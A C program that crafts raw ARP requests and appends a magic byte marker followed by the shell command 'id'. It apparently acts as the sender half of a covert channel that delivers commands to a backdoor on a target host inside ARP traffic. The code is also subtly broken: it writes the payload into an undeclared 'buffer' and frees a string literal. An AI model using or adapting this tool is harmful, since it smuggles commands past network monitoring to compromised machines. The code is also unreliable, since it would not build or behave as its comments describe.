#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>

#define ETH_ALEN 6
#define IP_LEN 4
#define ETH_TYPE_ARP 0x0806
#define ARP_REQUEST_OPCODE 0x0001
#define DEFAULT_PACKET_LEN 42
#define FLAG "\x70\x95\x05"

// Function to retrieve the MAC address of an interface
int get_mac_address(const char *iface, unsigned char *mac) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        return -1;
    }
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    return 0;
}

// Function to retrieve the IP address of an interface
int get_ip_address(const char *iface, struct in_addr *ip) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        return -1;
    }
    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
    close(fd);
    return 0;
}

// Function to create and send an ARP request with a payload
void send_arp_request(const char *iface, const char *target_ip_str) {
    int sockfd;
    unsigned char packet[DEFAULT_PACKET_LEN + 10];
    struct sockaddr_ll sa;
    unsigned char my_mac[ETH_ALEN], target_mac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    struct in_addr my_ip, target_ip;

    // Create raw socket
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Retrieve MAC and IP of the interface
    if (get_mac_address(iface, my_mac) < 0 || get_ip_address(iface, &my_ip) < 0) {
        fprintf(stderr, "Failed to get MAC or IP address of interface %s\n", iface);
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    inet_aton(target_ip_str, &target_ip);

    // Fill Ethernet header
    memcpy(packet, target_mac, ETH_ALEN);              // Destination MAC
    memcpy(packet + ETH_ALEN, my_mac, ETH_ALEN);        // Source MAC
    packet[12] = ETH_TYPE_ARP >> 8;
    packet[13] = ETH_TYPE_ARP & 0xff;

    // Fill ARP header
    unsigned char *arp_header = packet + 14;
    arp_header[0] = 0x00;                             // Hardware type (Ethernet)
    arp_header[1] = 0x01;
    arp_header[2] = 0x08;                             // Protocol type (IP)
    arp_header[3] = 0x00;
    arp_header[4] = ETH_ALEN;                          // Hardware size
    arp_header[5] = IP_LEN;                           // Protocol size
    arp_header[6] = ARP_REQUEST_OPCODE >> 8;          // Opcode (ARP Request)
    arp_header[7] = ARP_REQUEST_OPCODE & 0xff;

    // ARP Payload
    memcpy(arp_header + 8, my_mac, ETH_ALEN);          // Sender MAC address
    memcpy(arp_header + 14, &my_ip, IP_LEN);          // Sender IP address
    memcpy(arp_header + 18, target_mac, ETH_ALEN);     // Target MAC address (unknown)
    memcpy(arp_header + 24, &target_ip, IP_LEN);      // Target IP address

    // Append custom payload
    const char *payload = "id";
    size_t size = ETH_HLEN + 28 + strlen(payload) + strlen(FLAG);
    memcpy(buffer + ETH_HLEN + 28, FLAG, strlen(FLAG));
    memcpy(buffer + ETH_HLEN + 28 + strlen(FLAG), payload, strlen(payload));
    free(payload);
    size_t packet_len = ETH_HLEN + 28 + strlen(payload) + strlen(FLAG);

    // Set up socket address structure
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex(iface);
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, target_mac, ETH_ALEN);

    // Send the packet
    if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("sendto");
    } else {
        printf("ARP request sent to %s\n", target_ip_str);
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Retrieve interface name from file
    char iface[32];
    FILE *fp = fopen("./interface", "r");
    if (fp == NULL || fscanf(fp, "%31s", iface) != 1) {
        fprintf(stderr, "Error reading interface file.\n");
        exit(EXIT_FAILURE);
    }
    fclose(fp);

    send_arp_request(iface, argv[1]);

    return 0;
}
